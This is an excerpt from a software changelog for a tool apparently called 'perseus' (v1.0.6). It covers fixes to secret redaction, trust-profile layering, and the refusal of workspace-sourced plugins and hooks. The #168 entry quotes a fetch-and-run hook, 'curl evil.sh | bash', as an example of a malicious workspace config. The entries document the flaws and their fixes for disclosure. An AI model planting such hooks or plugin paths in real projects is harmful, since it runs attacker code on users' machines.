21|21|### üîí Security
22|22|
23|23|- **#136** ‚Äî `long_hex_secret` default redaction rule rewritten. The pre-1.0.6
24|24|  rule (`\b[a-fA-F0-9]{40,}\b`) silently destroyed git commit hashes (40 hex),
25|25|  SHA-256 checksums (64 hex), Docker digests, and Atlassian content hashes in
26|26|  `@query`, `@waypoint`, and `@perseus` output. The rule now requires an
27|27|  explicit credential anchor (`secret=`, `token:`, `api_key=`, `Authorization=`,
28|28|  etc.) before redacting hex strings. Real secrets in credential context are
29|29|  still caught; bare hashes survive verbatim. New regression tests in
30|30|  `tests/test_redaction.py`.
31|31|- Internal: redaction rules now support an optional `_anchor_group` field that
32|32|  identifies which capture group holds the secret payload (everything outside
33|33|  the group is preserved). Used by `long_hex_secret`; available for future
34|34|  context-aware rules.

36|36|### üîß Configuration & Trust Profiles
37|37|
38|38|- **#129** ‚Äî Trust profile layering made structural. Pre-1.0.6 a workspace
39|39|  config setting both `permissions.profile: balanced` and
40|40|  `render.allow_query_shell: true` silently rendered with shell execution
41|41|  disabled because the profile merge overwrote the user's explicit value.
42|42|  v1.0.6 uses `skip_keys` to guarantee that an explicit user value for any
43|43|  `render.*` boolean security gate always wins over the profile default,
44|44|  regardless of profile or direction. Also covers `allow_agent_shell`,
45|45|  `allow_services_command`, `allow_remote_services_health`, and
46|46|  `allow_outside_workspace`. Audit trail records layering decisions.

54|54|### üîí Security
55|55|
56|56|- **#169** ‚Äî Workspace-sourced plugin configuration (`plugins.dir`) is
57|57|  now refused by default. Pre-1.0.6 a workspace `.perseus/config.yaml`
58|58|  setting `plugins.dir: /path/to/attacker/code` caused
59|59|  `_discover_plugins()` to `spec.loader.exec_module(mod)` on every
60|60|  `.py` file in that directory at startup ‚Äî full Python execution
61|61|  before any directive trust gate, audit, or user prompt. Same attack
62|62|  vector as #168 but with no shell-quoting limits. Attack: git clone a
63|63|  malicious workspace, get pwned.
64|64|
65|65|  Fix: `_discover_plugins` consults
66|66|  `cfg["_provenance"]["plugins_workspace_sourced"]` set by
67|67|  `load_config`. Workspace-sourced plugin config is refused unless BOTH:
68|68|  1. Global `~/.perseus/config.yaml` sets `plugins.allow_workspace_sourced: true`
69|69|  2. Env var `PERSEUS_ALLOW_DANGEROUS=1`
70|70|
71|71|  Refusal emits a `plugins_workspace_refused` audit event with the
72|72|  refused directory path. Global-sourced plugin config is unaffected.
73|73|
74|74|  Regression suite (8 tests): workspace plugin dir refused by default,
75|75|  allowed with full opt-in, refused with only-global, refused with
76|76|  only-env, global plugins always load, audit trail, no false-positive
77|77|  refusal when no plugin config exists, allow-gate helper unit test.
78|78|
79|79|- **#168** ‚Äî Workspace-sourced shell hooks and Python `hooks.dir` are
80|80|  now refused by default. Pre-1.0.6 a workspace `.perseus/config.yaml`
81|81|  could declare `hooks.on_render_start: ["curl evil.sh | bash"]` and
82|82|  the command would run on the next `perseus render` ‚Äî no
83|83|  `allow_query_shell`, no `PERSEUS_ALLOW_DANGEROUS`, no audit. Same
84|84|  attack via `hooks.dir: /path/to/attacker/code` (Python top-level
85|85|  code runs at import time). Attack: git clone a malicious workspace,
86|86|  get pwned.
87|87|
88|88|  Fix: `load_config` annotates `cfg["_provenance"]` with which
89|89|  sections came from the workspace source. `hooks.py` refuses
90|90|  workspace-sourced shell hooks and `hooks.dir` Python hooks unless
91|91|  BOTH conditions are met:
92|92|  1. Global `~/.perseus/config.yaml` sets `hooks.allow_workspace_sourced: true`
93|93|  2. Env var `PERSEUS_ALLOW_DANGEROUS=1` is set
94|94|
95|95|  Refusal emits `hooks_workspace_refused` / `hooks_workspace_shell_refused`
96|96|  audit events plus a stderr warning. Global-sourced hooks are
97|97|  unaffected (the user owns global config; trust is implicit).
98|98|
99|99|  Regression suite (10 tests): workspace shell hook refused, allowed
100|100|  with full opt-in, refused with only-global opt-in, refused with
101|101|  only-env opt-in, global hooks always run, provenance tracking, audit
102|102|  trail, Python hooks.dir refused.

107|108|### üîí Security Hardening
108|109|
109|110|- **#129** ‚Äî Trust profile / user config layering is now **structurally**
110|111|  guaranteed to honor explicit user overrides, regardless of the textual
111|112|  order in which `_apply_permission_profile` and the user-merge run.
112|113|
113|114|  **Problem (pre-v1.0.6):** the layering precedence rule "user config wins
114|115|  over profile defaults" was correct *as documented* (see `task-45 AC #3`)
115|116|  but depended entirely on `load_config` calling `_apply_permission_profile`
116|117|  BEFORE the user-merge step. Any future refactor that reordered these two
117|118|  calls ‚Äî or a third caller that invoked the profile-apply directly without
118|119|  knowing the convention ‚Äî would silently revert a user who set
119|120|  `permissions.profile: balanced` AND `render.allow_query_shell: true` to
120|121|  `allow_query_shell=false`. This is exactly the scenario filed in #129
121|122|  ("balanced profile silently disables `@query` despite explicit override").
122|123|
123|124|  **Fix:**
124|125|  1. `load_config` now pre-scans all sources to collect every
125|126|     `(section, key)` the user has explicitly set, then passes that set
126|127|     to `_apply_permission_profile(..., skip_keys=...)` as the new
127|128|     keyword arg.
128|129|  2. `_apply_permission_profile` skips any key in `skip_keys`,
129|130|     structurally guaranteeing that user values win. The legacy
130|131|     no-skip-keys signature is preserved for backward compatibility.
131|132|  3. `load_config` emits a `config_profile_overridden` audit event
132|133|     enumerating which user-set keys won out over the profile. This
133|134|     makes the layering decision observable and debuggable.
134|135|
135|136|  **Regression test matrix:** 30 parametrized tests covering all 3
136|137|  profiles √ó all 5 boolean security gates √ó both override directions,
137|138|  plus 6 explicit tests for direct unit behavior, workspace>global
138|139|  precedence, audit-event observability, and no-noise audit events
139|140|  when only non-profile-managed keys are set.
140|141|
141|142|  No config breaking changes. Behavior is strictly safer.

430|### üêõ Bug Fixes
431|
432|- **#131** ‚Äî `perseus memory compact` no longer hangs indefinitely when an
433|  LLM provider (e.g. Ollama with a large model) is slow. Pre-1.0.6,
434|  `_mneme_compact_llm()` called `run_llm()` which only enforced
435|  `llm.timeout_s` (default 30s) on the HTTP request itself. With streaming
436|  token providers, individual tokens can arrive within timeout but total
437|  wall time was unbounded ‚Äî operators reported `memory compact` hanging
438|  for hours.
439|  - `_memory_do_compact()` now wraps the LLM call in a wall-clock deadline
440|    via `ThreadPoolExecutor.future.result(timeout=‚Ä¶)`.
441|  - New config knob `memory.compact_total_timeout_s` (default 180s).
442|    Set to 0 for pre-1.0.6 behavior (unbounded; not recommended).
443|  - On timeout, `_memory_do_compact` falls back to the deterministic
444|    narrative builder and writes a clear stderr message:
445|    `> ‚ö† Mnƒìmƒì compact: LLM provider 'ollama' exceeded
446|    compact_total_timeout_s=180s; falling back to deterministic narrative.`
447|  - New audit event `memory_compact_timeout` records provider, timeout
448|    value, and workspace hash for observability.
449|  - Same fallback path engages on any LLM exception (provider unreachable,
450|    payload error) ‚Äî `memory compact` always produces a usable narrative.
451|  - **Limitation:** ThreadPoolExecutor cannot truly kill the worker
452|    thread; the in-flight HTTP request continues until urllib's
453|    per-request timeout fires. Worst-case wait is therefore
454|    `compact_total_timeout_s + llm.timeout_s`. The leaked thread is
455|    daemonized and will not block process exit.
